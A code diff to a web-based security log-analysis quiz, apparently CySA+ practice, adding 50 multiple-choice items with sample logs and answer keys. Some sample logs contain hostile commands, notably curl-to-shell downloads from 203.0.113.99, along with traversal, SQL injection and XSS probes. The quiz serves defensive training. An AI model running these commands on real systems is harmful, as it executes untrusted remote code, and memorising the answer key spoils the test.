@@ -100,10 +100,11 @@
 <div id="quiz"></div>
 
 <script>
-// 10 base scenarios, then we clone them with different dates to make 50 total.
-// IMPORTANT: avoid writing the exact closing script tag text inside this code.
+// 50 distinct scenarios (no cloning, no duplicates).
+// IMPORTANT: we avoid any literal closing script tag text in strings.
 
-const baseQuestions = [
+const questions = [
+  // 1
   {
     log: `Feb 04 09:01:11 web01 sshd[1245]: Failed password for invalid user admin from 203.0.113.45 port 52134 ssh2
 Feb 04 09:01:13 web01 sshd[1247]: Failed password for invalid user admin from 203.0.113.45 port 52136 ssh2
@@ -117,8 +118,23 @@ Feb 04 09:01:16 web01 sshd[1250]: Failed password for invalid user admin from 20
     ],
     answer: 1
   },
+  // 2
   {
-    log: `Feb 04 10:15:22 fw01 kernel: IN=eth0 OUT= MAC=00:0c:29:aa:bb:cc SRC=198.51.100.77 DST=10.10.10.20 LEN=60 TOS=0x00 PREC=0x00 TTL=52 ID=54321 DF PROTO=TCP SPT=41523 DPT=22 WINDOW=64240 SYN
+    log: `Feb 05 02:01:11 web01 sshd[2001]: Failed password for invalid user root from 198.51.100.10 port 42111 ssh2
+Feb 05 02:01:13 web01 sshd[2002]: Failed password for invalid user oracle from 198.51.100.10 port 42112 ssh2
+Feb 05 02:01:15 web01 sshd[2003]: Failed password for invalid user test from 198.51.100.10 port 42113 ssh2`,
+    question: "Which pattern BEST matches this authentication activity?",
+    options: [
+      "Password spraying",
+      "Dictionary attack against multiple accounts",
+      "Normal login errors from a user",
+      "Account lockout test by an admin"
+    ],
+    answer: 1
+  },
+  // 3
+  {
+    log: `Feb 04 10:15:22 fw01 kernel: IN=eth0 OUT= MAC=00:0c:29:aa:bb:cc SRC=198.51.100.77 DST=10.10.10.20 LEN=60 PROTO=TCP SPT=41523 DPT=22 SYN
 Feb 04 10:15:23 fw01 kernel: IN=eth0 OUT= SRC=198.51.100.77 DST=10.10.10.20 PROTO=TCP SPT=41523 DPT=23 SYN
 Feb 04 10:15:24 fw01 kernel: IN=eth0 OUT= SRC=198.51.100.77 DST=10.10.10.20 PROTO=TCP SPT=41523 DPT=80 SYN
 Feb 04 10:15:25 fw01 kernel: IN=eth0 OUT= SRC=198.51.100.77 DST=10.10.10.20 PROTO=TCP SPT=41523 DPT=443 SYN`,
@@ -131,6 +147,21 @@ Feb 04 10:15:25 fw01 kernel: IN=eth0 OUT= SRC=198.51.100.77 DST=10.10.10.20 PROT
     ],
     answer: 2
   },
+  // 4
+  {
+    log: `Feb 06 03:33:01 fw01 kernel: IN=eth0 OUT= SRC=203.0.113.9 DST=10.10.10.30 LEN=60 PROTO=UDP SPT=55000 DPT=53
+Feb 06 03:33:02 fw01 kernel: IN=eth0 OUT= SRC=203.0.113.9 DST=10.10.10.30 LEN=60 PROTO=UDP SPT=55001 DPT=123
+Feb 06 03:33:03 fw01 kernel: IN=eth0 OUT= SRC=203.0.113.9 DST=10.10.10.30 LEN=60 PROTO=UDP SPT=55002 DPT=161`,
+    question: "What type of reconnaissance BEST fits this pattern?",
+    options: [
+      "TCP connect scan",
+      "UDP service scan",
+      "ICMP sweep",
+      "Application-layer fuzzing"
+    ],
+    answer: 1
+  },
+  // 5
   {
     log: `192.0.2.15 - - [04/Feb/2025:11:02:10 +0000] "GET /wp-login.php HTTP/1.1" 401 512 "-" "Mozilla/5.0"
 192.0.2.15 - - [04/Feb/2025:11:02:12 +0000] "POST /wp-login.php HTTP/1.1" 401 512 "-" "Mozilla/5.0"
@@ -145,8 +176,23 @@ Feb 04 10:15:25 fw01 kernel: IN=eth0 OUT= SRC=198.51.100.77 DST=10.10.10.20 PROT
     ],
     answer: 0
   },
+  // 6
   {
-    // XSS log uses encoded characters instead of a raw tag in the URL
+    log: `198.51.100.23 - - [05/Feb/2025:07:14:01 +0000] "POST /login HTTP/1.1" 401 256 "-" "Mozilla/5.0"
+203.0.113.50 - - [05/Feb/2025:07:14:02 +0000] "POST /login HTTP/1.1" 401 256 "-" "Mozilla/5.0"
+192.0.2.23 - - [05/Feb/2025:07:14:03 +0000] "POST /login HTTP/1.1" 401 256 "-" "Mozilla/5.0"
+203.0.113.77 - - [05/Feb/2025:07:14:04 +0000] "POST /login HTTP/1.1" 200 1024 "-" "Mozilla/5.0"`,
+    question: "Which attack type does this MOST likely indicate?",
+    options: [
+      "Password spraying from multiple IPs",
+      "Single-user brute-force from one IP",
+      "Session fixation",
+      "Legitimate SSO login attempts"
+    ],
+    answer: 0
+  },
+  // 7
+  {
     log: `203.0.113.88 - - [04/Feb/2025:12:33:41 +0000] "GET /search.php?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 400 298 "-" "Mozilla/5.0"`,
     question: "What type of attack is MOST likely represented by this request?",
     options: [
@@ -157,30 +203,7 @@ Feb 04 10:15:25 fw01 kernel: IN=eth0 OUT= SRC=198.51.100.77 DST=10.10.10.20 PROT
     ],
     answer: 1
   },
-  {
-    log: `Feb 04 13:11:08 ids01 snort[2222]: [1:2010935:4] ET POLICY DNS TUNNEL Possible DNS Tunneling Detected [Classification: Potential Corporate Privacy Violation] [Priority: 1] {UDP} 10.10.5.25:52341 -> 8.8.8.8:53
-Feb 04 13:11:09 ids01 snort[2222]: [1:2010935:4] ET POLICY DNS TUNNEL Possible DNS Tunneling Detected {UDP} 10.10.5.25:52341 -> 8.8.8.8:53`,
-    question: "What is the MOST likely concern based on these IDS alerts?",
-    options: [
-      "DNS cache poisoning",
-      "DNS amplification attack",
-      "DNS tunneling for data exfiltration",
-      "Normal DNS resolution traffic"
-    ],
-    answer: 2
-  },
-  {
-    log: `Feb 04 14:22:10 proxy01 http-proxy[4455]: 10.20.30.40 - HR-LAPTOP12 "POST http://198.51.100.200/upload HTTP/1.1" 200 52428800 "-" "curl/7.68.0"
-Feb 04 14:22:11 proxy01 http-proxy[4455]: Note: Uploaded 50MB to external host 198.51.100.200`,
-    question: "What is the MOST likely security issue indicated here?",
-    options: [
-      "Normal software update",
-      "Data exfiltration over HTTP",
-      "NTP misconfiguration",
-      "Malicious DNS zone transfer"
-    ],
-    answer: 1
-  },
+  // 8
   {
     log: `192.0.2.44 - - [04/Feb/2025:15:07:55 +0000] "GET /app.php?id=10 HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
 192.0.2.44 - - [04/Feb/2025:15:07:58 +0000] "GET /app.php?id=10%20OR%201%3D1-- HTTP/1.1" 500 4096 "-" "Mozilla/5.0"`,
@@ -193,10 +216,37 @@ Feb 04 14:22:11 proxy01 http-proxy[4455]: Note: Uploaded 50MB to external host 1
     ],
     answer: 0
   },
+  // 9
   {
-    log: `Feb 04 16:00:01 dns01 named[1337]: client 10.10.5.99#49152: query: asd98as9d8as9d.asd9as8d9as9d.example.com IN A + (10.10.5.99)
-Feb 04 16:00:02 dns01 named[1337]: client 10.10.5.99#49152: query: qwe98qwe98qwe98qwe.example.com IN A + (10.10.5.99)
-Feb 04 16:00:03 dns01 named[1337]: client 10.10.5.99#49152: query: zxcvzxcvzxcv123123.example.com IN A + (10.10.5.99)`,
+    log: `198.51.100.60 - - [06/Feb/2025:09:22:31 +0000] "GET /../../../../etc/passwd HTTP/1.1" 404 123 "-" "Mozilla/5.0"
+198.51.100.60 - - [06/Feb/2025:09:22:32 +0000] "GET /app/download?file=../../../../etc/shadow HTTP/1.1" 403 321 "-" "Mozilla/5.0"`,
+    question: "What attack is MOST likely occurring?",
+    options: [
+      "Directory traversal",
+      "Command injection",
+      "XSS",
+      "CSRF"
+    ],
+    answer: 0
+  },
+  // 10
+  {
+    log: `Feb 04 13:11:08 ids01 snort[2222]: ET POLICY DNS TUNNEL Possible DNS Tunneling Detected {UDP} 10.10.5.25:52341 -> 8.8.8.8:53
+Feb 04 13:11:09 ids01 snort[2222]: ET POLICY DNS TUNNEL Possible DNS Tunneling Detected {UDP} 10.10.5.25:52341 -> 8.8.8.8:53`,
+    question: "What is the MOST likely concern based on these IDS alerts?",
+    options: [
+      "DNS cache poisoning",
+      "DNS amplification attack",
+      "DNS tunneling for data exfiltration",
+      "Normal DNS resolution traffic"
+    ],
+    answer: 2
+  },
+  // 11
+  {
+    log: `Feb 05 16:00:01 dns01 named[1337]: client 10.10.5.99#49152: query: asd98as9d8as9d.asd9as8d9as9d.example.com IN A + (10.10.5.99)
+Feb 05 16:00:02 dns01 named[1337]: client 10.10.5.99#49152: query: qwe98qwe98qwe98qwe.example.com IN A + (10.10.5.99)
+Feb 05 16:00:03 dns01 named[1337]: client 10.10.5.99#49152: query: zxcvzxcvzxcv123123.example.com IN A + (10.10.5.99)`,
     question: "What is the MOST likely explanation for these DNS queries?",
     options: [
       "Benign content delivery network lookups",
@@ -206,6 +256,34 @@ Feb 04 16:00:03 dns01 named[1337]: client 10.10.5.99#49152: query: zxcvzxcvzxcv1
     ],
     answer: 1
   },
+  // 12
+  {
+    log: `Feb 06 09:15:11 vpn01 openvpn[2000]: AUTH FAILED, user=jdoe, remote IP=198.51.100.200
+Feb 06 09:15:20 vpn01 openvpn[2000]: AUTH FAILED, user=jdoe, remote IP=198.51.100.200
+Feb 06 09:15:30 vpn01 openvpn[2000]: AUTH SUCCESS, user=jdoe, remote IP=198.51.100.200, location=ForeignCountry`,
+    question: "What is the MOST likely concern?",
+    options: [
+      "Forgotten password",
+      "Brute-force followed by successful unauthorized VPN login from unusual location",
+      "Certificate mismatch",
+      "Split-tunnel VPN misconfiguration"
+    ],
+    answer: 1
+  },
+  // 13
+  {
+    log: `Feb 06 21:01:11 rdp-gw01 security: EventID 4625: An account failed to log on. Account Name: administrator, Logon Type: 10, Source Network Address: 203.0.113.10
+(repeated 120 times in 5 minutes)`,
+    question: "What is the MOST likely activity?",
+    options: [
+      "Privilege escalation on the RDP gateway",
+      "Remote Desktop brute-force attack",
+      "Normal failed logons from VPN users",
+      "Kerberos ticket renewal failure"
+    ],
+    answer: 1
+  },
+  // 14
   {
     log: `An account failed to log on.
 Subject: Security ID: S-1-0-0
@@ -230,6 +308,62 @@ Target Account: Administrators`,
     ],
     answer: 1
   },
+  // 15
+  {
+    log: `Security ID: CORP\\jdoe
+Event ID: 7045
+A service was installed in the system.
+Service Name: updatemgr
+Service File Name: C:\\Windows\\temp\\updatemgr.exe`,
+    question: "What is the MOST likely security implication of this log?",
+    options: [
+      "Routine OS hotfix",
+      "Potential persistence mechanism via malicious service",
+      "Uninstall of legacy software",
+      "Group Policy refresh"
+    ],
+    answer: 1
+  },
+  // 16
+  {
+    log: `Feb 04 14:22:10 proxy01 http-proxy[4455]: 10.20.30.40 - HR-LAPTOP12 "POST http://198.51.100.200/upload HTTP/1.1" 200 52428800 "-" "curl/7.68.0"
+Feb 04 14:22:11 proxy01 http-proxy[4455]: Note: Uploaded 50MB to external host 198.51.100.200`,
+    question: "What is the MOST likely security issue indicated here?",
+    options: [
+      "Normal software update",
+      "Data exfiltration over HTTP",
+      "NTP misconfiguration",
+      "Malicious DNS zone transfer"
+    ],
+    answer: 1
+  },
+  // 17
+  {
+    log: `Flow record: SRC=10.10.20.15 DST=203.0.113.200 BYTES_OUT=104857600 BYTES_IN=2048 PROTO=TCP DPT=443 DURATION=00:05:00
+Note: Destination not in known business partner list.`,
+    question: "What is the BEST description of this network flow?",
+    options: [
+      "Benign HTTPS web browsing",
+      "Large outbound data transfer, possible exfiltration",
+      "Inbound DDoS attack",
+      "ARP spoofing on the local network"
+    ],
+    answer: 1
+  },
+  // 18
+  {
+    log: `Feb 07 07:00:01 proxy01 http-proxy[4455]: 10.30.40.50 "CONNECT tor-exit.example:443 HTTP/1.1" 200 0 "-" "Mozilla/5.0"
+Feb 07 07:00:10 proxy01 http-proxy[4455]: Category: Anonymizer / Tor`,
+    question: "What is the MOST likely concern?",
+    options: [
+      "Software update over HTTPS",
+      "User attempting to bypass monitoring with anonymizing network",
+      "DNS sinkhole usage",
+      "Captive portal redirect"
+    ],
+    answer: 1
+  },
+  // 19
   {
     log: `Feb 04 18:45:12 filesrv01 antivirus: Detected: Ransom.Win32.Locky in C:\\Users\\jdoe\\Documents\\invoice.doc
 Feb 04 18:45:30 filesrv01 system: Many files renamed with extension .locky under \\\\fileshare\\Finance
@@ -242,23 +376,468 @@ Feb 04 18:45:45 filesrv01 system: User jdoe session disconnected`,
       "Misconfigured backup process"
     ],
     answer: 1
+  },
+  // 20
+  {
+    log: `Windows PowerShell log:
+Event ID: 4104
+ScriptBlock: powershell.exe -EncodedCommand SQBFAFgAIAAoAEcAZQB0AC0AVwBlAGIAQQBkAGQAcgBlAHMAcwApAA==`,
+    question: "What activity does this MOST likely indicate?",
+    options: [
+      "User changing wallpaper",
+      "Obfuscated PowerShell command, possible malware",
+      "Normal logon script",
+      "DNS cache flush"
+    ],
+    answer: 1
+  },
+  // 21
+  {
+    log: `Feb 05 12:44:01 win-srv01 TaskScheduler: A scheduled task was created.
+Task Name: \\Windows\\Update\\check
+Action: powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\update.ps1`,
+    question: "What is the MOST likely purpose of this change from an attacker perspective?",
+    options: [
+      "Privilege downgrade",
+      "Persistence through scheduled task",
+      "Network segmentation",
+      "VPN configuration"
+    ],
+    answer: 1
+  },
+  // 22
+  {
+    log: `Feb 05 09:11:00 linux-srv01 sudo: jdoe : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/jdoe
+Feb 05 09:11:10 linux-srv01 sudo: jdoe : TTY=pts/0 ; PWD=/home/jdoe ; COMMAND=/usr/bin/su root
+Feb 05 09:11:20 linux-srv01 usermod[2100]: change group wheel for user jdoe`,
+    question: "What risk is MOST strongly indicated by this sequence?",
+    options: [
+      "Failed application update",
+      "Privilege escalation to administrative group",
+      "Network DoS",
+      "Password spraying from external host"
+    ],
+    answer: 1
+  },
+  // 23
+  {
+    log: `AWS CloudTrail:
+Error: AccessDenied
+Event: AssumeRole
+User: arn:aws:iam::111122223333:user/temp
+Role: arn:aws:iam::111122223333:role/Admin`,
+    question: "What does this MOST likely indicate?",
+    options: [
+      "Misconfigured VPC peering",
+      "Attempt to gain higher privileges via IAM role",
+      "Normal S3 object access",
+      "Lambda function timeout"
+    ],
+    answer: 1
+  },
+  // 24
+  {
+    log: `AWS CloudTrail:
+Source IP: 198.51.100.250
+Event: GetObject
+Resource: arn:aws:s3:::finance-exports/monthly-report.csv
+UserAgent: python-requests/2.22`,
+    question: "What is the MOST appropriate concern from a security perspective?",
+    options: [
+      "S3 bucket logging disabled",
+      "Possible unauthorized download of sensitive data from S3",
+      "EC2 instance reboot",
+      "KMS key rotation"
+    ],
+    answer: 1
+  },
+  // 25
+  {
+    log: `Feb 04 19:01:11 ids01 snort[3000]: ET SCAN NMAP SYN Scan 10.10.1.5 -> 10.10.2.10:80
+Feb 04 19:01:12 ids01 snort[3000]: ET SCAN NMAP SYN Scan 10.10.1.5 -> 10.10.2.10:443`,
+    question: "What is the BEST label for this activity?",
+    options: [
+      "Misconfigured backup",
+      "Host discovery scan",
+      "Nmap reconnaissance scan",
+      "SQL injection attack"
+    ],
+    answer: 2
+  },
+  // 26
+  {
+    log: `Email gateway:
+From: user@example.com
+To: multiple-external@recipient.com
+Subject: Re: invoice
+Result: Message blocked - Attachment 'invoice.docm' detected as Trojan.Macro.Generic`,
+    question: "What is the MOST appropriate classification of this event?",
+    options: [
+      "False positive spam filter",
+      "Malicious email attachment detected and blocked",
+      "Phishing allowed through",
+      "Data exfiltration via email"
+    ],
+    answer: 1
+  },
+  // 27
+  {
+    log: `SMTP logs:
+User: jdoe@example.com
+Sent messages in last 10 minutes: 1200
+Many recipients returned as invalid`,
+    question: "What is the MOST likely explanation?",
+    options: [
+      "Mass password reset campaign",
+      "Compromised mailbox sending spam",
+      "Backup MX misconfiguration",
+      "Normal newsletter distribution"
+    ],
+    answer: 1
+  },
+  // 28
+  {
+    log: `VPN logs:
+User: jdoe
+Login 1: 2025-02-04T09:00Z from 198.51.100.10 (New York)
+Login 2: 2025-02-04T09:30Z from 203.0.113.50 (Tokyo)`,
+    question: "What does this pattern MOST likely represent?",
+    options: [
+      "Clock drift on VPN server",
+      "Impossible travel indicating credential compromise",
+      "Split-tunnel VPN configuration",
+      "Old certificate in use"
+    ],
+    answer: 1
+  },
+  // 29
+  {
+    log: `Wireless controller log:
+Detected SSID: CORP_WIFI
+BSSID: aa:bb:cc:dd:ee:ff
+Status: Rogue AP with same SSID, different MAC, connected to unsecured network`,
+    question: "What threat does this MOST likely indicate?",
+    options: [
+      "Evil twin access point",
+      "Weak WPA2 PSK",
+      "Bluetooth jamming",
+      "DNS spoofing"
+    ],
+    answer: 0
+  },
+  // 30
+  {
+    log: `Feb 04 10:10:10 dhcp01 dhcpd[1000]: DHCPACK on 10.10.1.50 to 00:11:22:33:44:55
+Feb 04 10:10:20 dhcp01 dhcpd[1000]: DHCPACK on 10.10.1.51 to 00:11:22:33:44:55
+Feb 04 10:10:30 dhcp01 dhcpd[1000]: DHCPACK on 10.10.1.52 to 00:11:22:33:44:55`,
+    question: "What suspicious behavior is BEST indicated?",
+    options: [
+      "Normal IP renewal",
+      "MAC spoofing or rogue device moving across IPs",
+      "DNS tunneling",
+      "Time sync failure"
+    ],
+    answer: 1
+  },
+  // 31
+  {
+    log: `Switch log:
+%SW_SEC-4-PORT_SECURITY_VIOLATION: Security violation occurred, MAC address 00:11:22:33:44:55 on port Gi0/1
+%SW_SEC-4-PORT_SECURITY_VIOLATION: Port Gi0/1 shutdown`,
+    question: "What is the MOST likely cause?",
+    options: [
+      "Duplex mismatch",
+      "Excessive broadcast traffic",
+      "Unauthorized device connected to a secure port",
+      "Spanning tree change"
+    ],
+    answer: 2
+  },
+  // 32
+  {
+    log: `IDS log:
+ALERT: ARP Cache Poisoning Attack
+Source MAC: 00:aa:bb:cc:dd:01
+Target IP: 10.10.1.1 (Gateway)`,
+    question: "What attack type is MOST likely occurring?",
+    options: [
+      "DNS spoofing",
+      "ARP poisoning / man-in-the-middle",
+      "ICMP flood",
+      "VLAN hopping"
+    ],
+    answer: 1
+  },
+  // 33
+  {
+    log: `Firewall log:
+Action: Deny
+SRC: 203.0.113.99 DST: 10.10.20.10 DPT: 1433 PROTO: TCP
+Reason: Inbound to database port from untrusted network`,
+    question: "What is the BEST description of this event?",
+    options: [
+      "SQL query error",
+      "Blocked attempt to access database server from the internet",
+      "Legitimate VPN tunnel setup",
+      "Misconfigured NAT"
+    ],
+    answer: 1
+  },
+  // 34
+  {
+    log: `Web server log:
+10.10.5.55 - - [04/Feb/2025:15:10:33 +0000] "GET /admin/ HTTP/1.1" 302 512 "-" "-"
+10.10.5.55 - - [04/Feb/2025:15:10:34 +0000] "GET /admin/login HTTP/1.1" 200 1024 "-" "-"
+10.10.5.55 - - [04/Feb/2025:15:10:35 +0000] "GET /admin/config.php HTTP/1.1" 403 256 "-" "-"`,
+    question: "Which description BEST fits this pattern?",
+    options: [
+      "Automated directory brute forcing",
+      "User changing password",
+      "SSO redirect loop",
+      "DNS resolution failure"
+    ],
+    answer: 0
+  },
+  // 35
+  {
+    log: `IDS log:
+ET EXPLOIT SMB Brute Force attack detected
+SRC: 10.10.5.20 DST: 10.10.5.30 PROTO: TCP DPT:445
+Count: 500 attempts in 60 seconds`,
+    question: "What is MOST likely happening?",
+    options: [
+      "Patch deployment",
+      "SMB brute force for credential guessing",
+      "Normal file copy",
+      "DHCP starvation"
+    ],
+    answer: 1
+  },
+  // 36
+  {
+    log: `Linux auth.log:
+Feb 04 08:00:01 crond[1200]: (root) CMD (/usr/bin/curl http://203.0.113.99/payload.sh | /bin/bash)
+Job scheduled in user crontab: * * * * *`,
+    question: "What is the MOST serious security issue here?",
+    options: [
+      "Missing HTTPS on website",
+      "Backdoor persistence via cron running remote script",
+      "System time misconfiguration",
+      "Excessive logging"
+    ],
+    answer: 1
+  },
+  // 37
+  {
+    log: `Web server log:
+198.51.100.80 - - "GET / HTTP/1.1" 200 1024 "-" "-"
+198.51.100.80 - - "GET /login HTTP/1.1" 200 1024 "-" "-"
+198.51.100.80 - - "POST /login HTTP/1.1" 200 2048 "-" "-"
+Set-Cookie: session=; Secure; HttpOnly`,
+    question: "Which concern is MOST relevant to look for next?",
+    options: [
+      "Whether session cookies are properly protected",
+      "DNS amplification",
+      "ARP poisoning",
+      "RAID failure"
+    ],
+    answer: 0
+  },
+  // 38
+  {
+    log: `Apache log:
+203.0.113.200 - - "GET /phpinfo.php HTTP/1.1" 200 5000 "-" "-"
+203.0.113.200 - - "GET /test.php HTTP/1.1" 404 256 "-" "-"
+203.0.113.200 - - "GET /shell.php HTTP/1.1" 404 256 "-" "-"`,
+    question: "What is the BEST description of this behavior?",
+    options: [
+      "Backup software testing",
+      "Attacker looking for web shells or test pages",
+      "Search engine indexing",
+      "Normal CMS upgrade"
+    ],
+    answer: 1
+  },
+  // 39
+  {
+    log: `Windows Event Log:
+Event ID 4688: A new process has been created.
+New Process Name: C:\\Windows\\System32\\cmd.exe
+Creator Process Name: C:\\Users\\jdoe\\AppData\\Roaming\\hr-report.exe`,
+    question: "What is the MOST likely concern?",
+    options: [
+      "User opened a browser",
+      "Potential malware spawning command shell",
+      "Printer driver update",
+      "Group Policy refresh"
+    ],
+    answer: 1
+  },
+  // 40
+  {
+    log: `SIEM correlation:
+Multiple failed logons for service account svc-sql on DB-SRV01 from host HR-PC01
+Followed by successful interactive logon using svc-sql from HR-PC01`,
+    question: "What does this MOST likely indicate?",
+    options: [
+      "Normal rotation of service account password",
+      "Credential theft and misuse of service account",
+      "Kerberos clock skew",
+      "Database maintenance job"
+    ],
+    answer: 1
+  },
+  // 41
+  {
+    log: `Linux web server:
+Feb 04 05:11:11 httpd[1001]: Segmentation fault in module php7
+Immediately after receiving request with long parameter 'q=AAAA....AAAA' (10,000 chars)`,
+    question: "What is the MOST likely type of test or attack?",
+    options: [
+      "DNS poisoning",
+      "Buffer overflow or fuzzing attempt",
+      "SSL certificate renewal",
+      "Brute-force login"
+    ],
+    answer: 1
+  },
+  // 42
+  {
+    log: `VPN logs:
+User: contractor1
+Group: ThirdParty
+Accessed internal server: 10.10.20.20:3389 (RDP)
+Action: Allowed`,
+    question: "From a CySA+ perspective, what should you MOST focus on?",
+    options: [
+      "Ensuring least privilege and segmentation for third-party access",
+      "Disabling RDP on all servers",
+      "Blocking all VPN traffic",
+      "Resetting DHCP leases"
+    ],
+    answer: 0
+  },
+  // 43
+  {
+    log: `Proxy log:
+10.10.5.10 "GET http://paste.example.com/raw/abcd1234 HTTP/1.1" 200 4096 "-" "curl/7.58.0"
+Content categorized as: Anonymous text sharing`,
+    question: "Why might this be a security concern?",
+    options: [
+      "Indicates DNS tunneling",
+      "Paste sites often used to store exfiltrated data or malicious scripts",
+      "Breaks TLS inspection",
+      "Causes ARP cache overflow"
+    ],
+    answer: 1
+  },
+  // 44
+  {
+    log: `IDS log:
+ET POLICY PE EXE or DLL Windows file download
+SRC: 198.51.100.55 DST: 10.10.5.25
+URL: http://malicious.example/bot.exe`,
+    question: "What is the BEST next step?",
+    options: [
+      "Ignore as normal traffic",
+      "Isolate the host and check for malware infection",
+      "Disable DNSSEC",
+      "Reboot the IDS sensor"
+    ],
+    answer: 1
+  },
+  // 45
+  {
+    log: `Database audit log:
+User: appuser
+Action: SELECT * FROM customers WHERE 1=1;
+Rows returned: 50000
+Client IP: 10.10.5.55
+Time: 02:30 local (outside business hours)`,
+    question: "What is the MOST likely concern?",
+    options: [
+      "Index fragmentation",
+      "Possible mass data exfiltration using application account",
+      "Normal batch report",
+      "Deadlock condition"
+    ],
+    answer: 1
+  },
+  // 46
+  {
+    log: `Kubernetes audit log:
+user: system:serviceaccount:default:default
+verb: create
+resource: pods/exec
+command: ["sh","-c","curl http://203.0.113.99/x | sh"]`,
+    question: "What is the MOST likely issue?",
+    options: [
+      "Container restart policy",
+      "Malicious command execution inside a pod",
+      "Node autoscaling",
+      "Log rotation"
+    ],
+    answer: 1
+  },
+  // 47
+  {
+    log: `Windows Event Log:
+Event ID 1102: The audit log was cleared.
+Subject: CORP\\jdoe`,
+    question: "What does this MOST likely signify in an investigation?",
+    options: [
+      "Routine maintenance",
+      "Possible attempt to cover attacker activity",
+      "Group Policy update",
+      "Successful patch installation"
+    ],
+    answer: 1
+  },
+  // 48
+  {
+    log: `SIEM alert:
+Use of 'net user' and 'net localgroup administrators' commands from host FIN-WS10
+User: CORP\\jdoe
+Time: 23:55 local`,
+    question: "What is the MOST likely security-relevant activity?",
+    options: [
+      "User checking printer status",
+      "Reconnaissance for local privilege escalation",
+      "DNS resolution",
+      "Software license check"
+    ],
+    answer: 1
+  },
+  // 49
+  {
+    log: `IDS log:
+ET TROJAN Possible Meterpreter Reverse Shell (TCP 4444)
+SRC: 10.10.5.25 DST: 203.0.113.200 DPT:4444`,
+    question: "What is the MOST accurate description of this?",
+    options: [
+      "Benign SSH session",
+      "Potential remote control channel from compromised host",
+      "NTP query",
+      "SMTP relay"
+    ],
+    answer: 1
+  },
+  // 50
+  {
+    log: `VPN logs:
+User: admin
+Authentication method changed from certificate to password-only
+Change made by: admin from IP 10.10.1.5`,
+    question: "What is the MOST important risk of this configuration change?",
+    options: [
+      "Too many VPN tunnels",
+      "Reduced authentication strength increasing risk of compromise",
+      "Excessive logging",
+      "Time synchronization problems"
+    ],
+    answer: 1
   }
 ];
-
-// Expand to 50 questions by cloning base with slight date tweaks
-let questions = [];
-for(let i = 0; i < 5; i++){ // 5 * 10 = 50
-  baseQuestions.forEach((q, idx) => {
-    const day = String(4 + i).padStart(2, "0"); // 04..08
-    const clonedLog = q.log.replace("Feb 04", `Feb ${day}`);
-    questions.push({
-      log: clonedLog,
-      question: q.question,
-      options: q.options,
-      answer: q.answer
-    });
-  });
-}
 
 // Fisher–Yates shuffle
 function shuffle(array){
@@ -283,7 +862,7 @@ questions.forEach((q, idx) => {
   card.appendChild(header);
 
   const pre = document.createElement("pre");
-  pre.textContent = q.log; // textContent keeps it safe
+  pre.textContent = q.log; // show raw log safely
   card.appendChild(pre);
 
   const qtext = document.createElement("div");
@@ -307,7 +886,6 @@ questions.forEach((q, idx) => {
     btn.textContent = optText;
 
     btn.addEventListener("click", () => {
-      // If already answered correctly, ignore
       if(feedback.classList.contains("correct")) return;
 
       if(optIdx === q.answer){
